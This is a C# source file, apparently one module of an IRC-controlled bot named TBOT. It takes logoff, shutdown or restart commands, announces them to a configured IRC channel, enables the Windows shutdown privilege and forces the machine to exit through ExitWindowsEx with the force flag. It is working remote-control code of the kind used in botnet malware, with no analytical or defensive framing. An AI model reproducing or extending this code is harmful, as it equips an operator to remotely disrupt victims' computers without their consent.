using System;
using System.Runtime.InteropServices;

namespace TBOT;

internal class Shutdown
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct TokPriv1Luid
	{
		public int Count;

		public long Luid;

		public int Attr;
	}

	internal const int SE_PRIVILEGE_ENABLED = 2;

	internal const int TOKEN_QUERY = 8;

	internal const int TOKEN_ADJUST_PRIVILEGES = 32;

	internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

	internal const int EWX_LOGOFF = 0;

	internal const int EWX_SHUTDOWN = 1;

	internal const int EWX_REBOOT = 2;

	internal const int EWX_FORCE = 4;

	internal const int EWX_POWEROFF = 8;

	internal const int EWX_FORCEIFHUNG = 16;

	public static void doCommand(string type)
	{
		switch (type.ToLower())
		{
		case "logoff":
			Irc.WriteTo(Config.ircChannel, "Logging off now.");
			DoExitWin(0);
			break;
		case "shutdown":
			Irc.WriteTo(Config.ircChannel, "Shutting down now.");
			DoExitWin(1);
			break;
		case "restart":
			Irc.WriteTo(Config.ircChannel, "Restarting now.");
			DoExitWin(2);
			break;
		}
	}

	[DllImport("kernel32.dll", ExactSpelling = true)]
	internal static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

	[DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool ExitWindowsEx(int flg, int rea);

	private static void DoExitWin(int flg)
	{
		IntPtr currentProcess = GetCurrentProcess();
		IntPtr phtok = IntPtr.Zero;
		OpenProcessToken(currentProcess, 40, ref phtok);
		TokPriv1Luid newst = default(TokPriv1Luid);
		newst.Count = 1;
		newst.Luid = 0L;
		newst.Attr = 2;
		LookupPrivilegeValue(null, "SeShutdownPrivilege", ref newst.Luid);
		AdjustTokenPrivileges(phtok, disall: false, ref newst, 0, IntPtr.Zero, IntPtr.Zero);
		ExitWindowsEx(flg | 4, 0);
	}
}
